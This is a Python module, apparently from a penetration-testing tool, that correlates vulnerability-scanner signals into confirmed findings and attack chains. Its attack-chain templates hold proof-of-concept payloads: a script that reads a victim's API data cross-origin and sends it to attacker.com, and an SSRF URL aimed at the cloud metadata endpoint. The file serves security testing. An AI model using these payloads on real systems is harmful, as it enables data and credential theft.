"""
Lynx VAPT - Vulnerability Correlation Engine

Combines signals from multiple scanners to identify high-confidence findings
and chainable attack vectors.

Features:
- Multi-signal correlation for high-confidence detection
- Attack chain identification
- Cross-scanner signal aggregation
- Confidence scoring based on correlated evidence

Author: Lynx Team
"""

import asyncio
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Set, Tuple, Callable
from enum import Enum
from collections import defaultdict


class SignalType(Enum):
    """Types of signals scanners can emit."""
    # Injection signals
    SQL_ERROR = "sql_error"
    SQL_TIME_DELAY = "sql_time_delay"
    PARAM_REFLECTION = "param_reflection"
    ERROR_MESSAGE = "error_message"
    
    # XSS signals
    XSS_REFLECTION = "xss_reflection"
    DOM_MANIPULATION = "dom_manipulation"
    SCRIPT_EXECUTION = "script_execution"
    
    # Access control signals
    AUTH_BYPASS = "auth_bypass"
    IDOR_DETECTED = "idor_detected"
    PRIV_ESCALATION = "priv_escalation"
    
    # Configuration signals
    WEAK_CORS = "weak_cors"
    MISSING_HEADERS = "missing_headers"
    INFO_DISCLOSURE = "info_disclosure"
    
    # Secret/credential signals
    SECRET_LEAKED = "secret_leaked"
    API_KEY_FOUND = "api_key_found"
    JWT_WEAK = "jwt_weak"
    
    # Redirect/SSRF signals
    OPEN_REDIRECT = "open_redirect"
    SSRF_DETECTED = "ssrf_detected"
    
    # Other signals
    FILE_UPLOAD = "file_upload"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_EXEC = "command_exec"


@dataclass
class Signal:
    """A signal emitted by a scanner."""
    signal_type: SignalType
    scanner_name: str
    url: str
    payload: Optional[str] = None
    details: str = ""
    confidence: float = 0.5
    timestamp: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def __hash__(self):
        return hash((self.signal_type, self.scanner_name, self.url, self.payload))


@dataclass
class CorrelationRule:
    """
    Rule for correlating multiple signals into a high-confidence finding.
    """
    name: str
    description: str
    required_signals: List[SignalType]
    optional_signals: List[SignalType] = field(default_factory=list)
    min_required: int = 0  # If 0, all required_signals must match
    result_vuln_type: str = ""
    result_severity: str = "P2"
    confidence_boost: float = 0.3
    
    def __post_init__(self):
        if self.min_required == 0:
            self.min_required = len(self.required_signals)


@dataclass
class AttackChain:
    """
    Represents a chain of vulnerabilities that can be combined.
    """
    name: str
    description: str
    steps: List[str]
    signals: List[Signal]
    total_impact: str
    exploitation_difficulty: str = "Medium"
    prerequisites: List[str] = field(default_factory=list)
    poc_outline: str = ""


@dataclass
class CorrelatedFinding:
    """
    A finding produced by correlating multiple signals.
    """
    vuln_type: str
    severity: str
    url: str
    confidence: float
    signals: List[Signal]
    rule_name: str
    description: str
    attack_chain: Optional[AttackChain] = None


class CorrelationEngine:
    """
    Engine for correlating signals from multiple scanners.
    
    This helps identify:
    - High-confidence vulnerabilities (multiple signals confirm)
    - Attack chains (vulnerabilities that can be combined)
    - Reduce false positives (single signals may be noise)
    """
    
    # Pre-defined correlation rules
    DEFAULT_RULES = [
        # SQL Injection - high confidence
        CorrelationRule(
            name="Confirmed SQL Injection",
            description="SQL error combined with parameter reflection or time delay",
            required_signals=[SignalType.SQL_ERROR],
            optional_signals=[SignalType.PARAM_REFLECTION, SignalType.SQL_TIME_DELAY],
            min_required=1,
            result_vuln_type="SQL Injection (Confirmed)",
            result_severity="P1",
            confidence_boost=0.35
        ),
        
        # XSS - high confidence
        CorrelationRule(
            name="Confirmed XSS",
            description="XSS reflection with script execution",
            required_signals=[SignalType.XSS_REFLECTION, SignalType.SCRIPT_EXECUTION],
            min_required=2,
            result_vuln_type="XSS (Confirmed)",
            result_severity="P1",
            confidence_boost=0.4
        ),
        
        # Token theft chain
        CorrelationRule(
            name="Token Theft Attack Chain",
            description="Weak CORS combined with exposed secrets enables token theft",
            required_signals=[SignalType.WEAK_CORS, SignalType.SECRET_LEAKED],
            optional_signals=[SignalType.API_KEY_FOUND],
            result_vuln_type="Attack Chain: Token Theft",
            result_severity="P1",
            confidence_boost=0.25
        ),
        
        # Account takeover chain
        CorrelationRule(
            name="Account Takeover Chain",
            description="Authentication bypass or IDOR combined with privilege escalation",
            required_signals=[SignalType.AUTH_BYPASS, SignalType.PRIV_ESCALATION],
            optional_signals=[SignalType.IDOR_DETECTED],
            min_required=2,
            result_vuln_type="Attack Chain: Account Takeover",
            result_severity="P1",
            confidence_boost=0.35
        ),
        
        # SSRF to internal access
        CorrelationRule(
            name="SSRF Chain",
            description="Open redirect combined with SSRF enables internal network access",
            required_signals=[SignalType.OPEN_REDIRECT, SignalType.SSRF_DETECTED],
            min_required=2,
            result_vuln_type="Attack Chain: SSRF via Redirect",
            result_severity="P1",
            confidence_boost=0.3
        ),
        
        # Information disclosure chain
        CorrelationRule(
            name="Sensitive Data Exposure",
            description="Information disclosure combined with weak security headers",
            required_signals=[SignalType.INFO_DISCLOSURE],
            optional_signals=[SignalType.MISSING_HEADERS, SignalType.WEAK_CORS],
            min_required=1,
            result_vuln_type="Sensitive Data Exposure",
            result_severity="P2",
            confidence_boost=0.2
        ),
        
        # RCE chain
        CorrelationRule(
            name="Remote Code Execution",
            description="File upload combined with path traversal or command execution",
            required_signals=[SignalType.FILE_UPLOAD],
            optional_signals=[SignalType.PATH_TRAVERSAL, SignalType.COMMAND_EXEC],
            min_required=2,
            result_vuln_type="Attack Chain: RCE",
            result_severity="P1",
            confidence_boost=0.4
        ),
    ]
    
    # Attack chain templates
    ATTACK_CHAINS = {
        "token_theft": AttackChain(
            name="Token Theft via CORS Misconfiguration",
            description="Exploiting weak CORS to steal authentication tokens",
            steps=[
                "1. Identify weak CORS policy (Access-Control-Allow-Origin: *)",
                "2. Locate exposed API with sensitive data",
                "3. Create malicious page that makes cross-origin request",
                "4. Steal tokens/credentials returned in response"
            ],
            signals=[],
            total_impact="Full account compromise",
            exploitation_difficulty="Low",
            prerequisites=["Victim must visit attacker-controlled page"],
            poc_outline="""
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Exfiltrate data
    fetch('https://attacker.com/collect?data=' + btoa(JSON.stringify(data)));
  });
</script>
"""
        ),
        "ssrf_chain": AttackChain(
            name="SSRF via Open Redirect",
            description="Chaining open redirect with SSRF to access internal resources",
            steps=[
                "1. Identify open redirect vulnerability",
                "2. Locate SSRF-vulnerable parameter",
                "3. Use redirect to bypass SSRF URL validation",
                "4. Access internal services (metadata, admin panels)"
            ],
            signals=[],
            total_impact="Internal network access, credential theft",
            exploitation_difficulty="Medium",
            prerequisites=["SSRF must follow redirects"],
            poc_outline="""
# Open redirect: https://target.com/redirect?url=
# SSRF: https://target.com/fetch?url=

# Chain:
https://target.com/fetch?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
"""
        ),
    }
    
    def __init__(self, rules: Optional[List[CorrelationRule]] = None):
        self.rules = rules or self.DEFAULT_RULES
        
        # Signal storage
        self.signals: List[Signal] = []
        self.signals_by_url: Dict[str, List[Signal]] = defaultdict(list)
        self.signals_by_type: Dict[SignalType, List[Signal]] = defaultdict(list)
        
        # Correlation results
        self.correlations: List[CorrelatedFinding] = []
        
        # Lock for thread safety
        self._lock = asyncio.Lock()
    
    async def add_signal(self, signal: Signal):
        """Add a signal from a scanner."""
        async with self._lock:
            self.signals.append(signal)
            self.signals_by_url[signal.url].append(signal)
            self.signals_by_type[signal.signal_type].append(signal)
    
    async def emit_signal(
        self,
        signal_type: SignalType,
        scanner_name: str,
        url: str,
        payload: Optional[str] = None,
        details: str = "",
        confidence: float = 0.5,
        metadata: Optional[Dict] = None
    ):
        """Convenience method to emit a signal."""
        import time
        signal = Signal(
            signal_type=signal_type,
            scanner_name=scanner_name,
            url=url,
            payload=payload,
            details=details,
            confidence=confidence,
            timestamp=time.time(),
            metadata=metadata or {}
        )
        await self.add_signal(signal)
    
    async def correlate(self) -> List[CorrelatedFinding]:
        """
        Run correlation on all collected signals.
        
        Returns:
            List of correlated findings
        """
        async with self._lock:
            self.correlations = []
            
            # Group signals by URL for correlation
            for url, signals in self.signals_by_url.items():
                signal_types = {s.signal_type for s in signals}
                
                # Try each rule
                for rule in self.rules:
                    matching = self._check_rule(rule, signal_types, signals)
                    
                    if matching:
                        # Calculate combined confidence
                        base_confidence = sum(s.confidence for s in matching) / len(matching)
                        boosted_confidence = min(1.0, base_confidence + rule.confidence_boost)
                        
                        # Create correlated finding
                        finding = CorrelatedFinding(
                            vuln_type=rule.result_vuln_type,
                            severity=rule.result_severity,
                            url=url,
                            confidence=boosted_confidence,
                            signals=matching,
                            rule_name=rule.name,
                            description=rule.description,
                            attack_chain=self._get_attack_chain(rule, matching)
                        )
                        
                        self.correlations.append(finding)
            
            return self.correlations
    
    def _check_rule(
        self,
        rule: CorrelationRule,
        signal_types: Set[SignalType],
        signals: List[Signal]
    ) -> List[Signal]:
        """
        Check if a rule matches the signal types.
        
        Returns:
            List of matching signals, or empty list if no match
        """
        required_matched = []
        optional_matched = []
        
        for sig_type in rule.required_signals:
            if sig_type in signal_types:
                matching_signals = [s for s in signals if s.signal_type == sig_type]
                required_matched.extend(matching_signals)
        
        for sig_type in rule.optional_signals:
            if sig_type in signal_types:
                matching_signals = [s for s in signals if s.signal_type == sig_type]
                optional_matched.extend(matching_signals)
        
        # Check if minimum required signals are met
        total_matched = len(required_matched) + len(optional_matched)
        
        if len(required_matched) >= rule.min_required:
            return required_matched + optional_matched
        
        if total_matched >= rule.min_required:
            return required_matched + optional_matched
        
        return []
    
    def _get_attack_chain(
        self,
        rule: CorrelationRule,
        signals: List[Signal]
    ) -> Optional[AttackChain]:
        """Get attack chain template if applicable."""
        if "Token Theft" in rule.name:
            chain = AttackChain(**self.ATTACK_CHAINS["token_theft"].__dict__)
            chain.signals = signals
            return chain
        
        if "SSRF" in rule.name:
            chain = AttackChain(**self.ATTACK_CHAINS["ssrf_chain"].__dict__)
            chain.signals = signals
            return chain
        
        return None
    
    async def get_high_confidence_findings(
        self,
        min_confidence: float = 0.7
    ) -> List[CorrelatedFinding]:
        """Get only high-confidence correlated findings."""
        if not self.correlations:
            await self.correlate()
        
        return [f for f in self.correlations if f.confidence >= min_confidence]
    
    async def get_attack_chains(self) -> List[AttackChain]:
        """Get all identified attack chains."""
        if not self.correlations:
            await self.correlate()
        
        return [f.attack_chain for f in self.correlations if f.attack_chain]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get correlation statistics."""
        return {
            "total_signals": len(self.signals),
            "unique_urls": len(self.signals_by_url),
            "signal_types": {
                st.value: len(signals)
                for st, signals in self.signals_by_type.items()
            },
            "correlations": len(self.correlations),
            "attack_chains": len([c for c in self.correlations if c.attack_chain])
        }
    
    async def clear(self):
        """Clear all signals and correlations."""
        async with self._lock:
            self.signals.clear()
            self.signals_by_url.clear()
            self.signals_by_type.clear()
            self.correlations.clear()


class SignalEmitter:
    """
    Mixin for scanners to emit signals to the correlation engine.
    """
    
    def __init__(self, correlation_engine: Optional[CorrelationEngine] = None):
        self._correlation_engine = correlation_engine
    
    def set_correlation_engine(self, engine: CorrelationEngine):
        """Set the correlation engine."""
        self._correlation_engine = engine
    
    async def emit_signal(
        self,
        signal_type: SignalType,
        url: str,
        payload: Optional[str] = None,
        details: str = "",
        confidence: float = 0.5,
        metadata: Optional[Dict] = None
    ):
        """Emit a signal to the correlation engine."""
        if self._correlation_engine:
            await self._correlation_engine.emit_signal(
                signal_type=signal_type,
                scanner_name=self.__class__.__name__,
                url=url,
                payload=payload,
                details=details,
                confidence=confidence,
                metadata=metadata
            )


# Mapping from vulnerability types to signal types
VULN_TO_SIGNAL: Dict[str, SignalType] = {
    "SQL Injection": SignalType.SQL_ERROR,
    "Time-Based SQLi": SignalType.SQL_TIME_DELAY,
    "Reflected XSS": SignalType.XSS_REFLECTION,
    "DOM/Reflected XSS (Selenium Verified)": SignalType.SCRIPT_EXECUTION,
    "CORS Misconfiguration": SignalType.WEAK_CORS,
    "Weak Security Headers": SignalType.MISSING_HEADERS,
    "Secret Leaked": SignalType.SECRET_LEAKED,
    "API Endpoint Found": SignalType.INFO_DISCLOSURE,
    "Open Redirect": SignalType.OPEN_REDIRECT,
    "Potential SSRF": SignalType.SSRF_DETECTED,
    "Potential IDOR": SignalType.IDOR_DETECTED,
    "IDOR": SignalType.IDOR_DETECTED,
    "Authentication Bypass": SignalType.AUTH_BYPASS,
    "Mass Assignment": SignalType.PRIV_ESCALATION,
    "Local File Inclusion": SignalType.PATH_TRAVERSAL,
    "Command Injection": SignalType.COMMAND_EXEC,
}


def vuln_type_to_signal(vuln_type: str) -> Optional[SignalType]:
    """Convert a vulnerability type to a signal type."""
    return VULN_TO_SIGNAL.get(vuln_type)


# Global correlation engine instance
_correlation_engine: Optional[CorrelationEngine] = None


def get_correlation_engine() -> CorrelationEngine:
    """Get or create the global correlation engine."""
    global _correlation_engine
    if _correlation_engine is None:
        _correlation_engine = CorrelationEngine()
    return _correlation_engine


async def add_vuln_signal(
    vuln_type: str,
    scanner_name: str,
    url: str,
    payload: Optional[str] = None,
    details: str = "",
    confidence: float = 0.5
):
    """
    Convenience function to add a vulnerability as a signal.
    
    Call this from scanners when emitting vulnerabilities.
    """
    signal_type = vuln_type_to_signal(vuln_type)
    if signal_type:
        engine = get_correlation_engine()
        await engine.emit_signal(
            signal_type=signal_type,
            scanner_name=scanner_name,
            url=url,
            payload=payload,
            details=details,
            confidence=confidence
        )
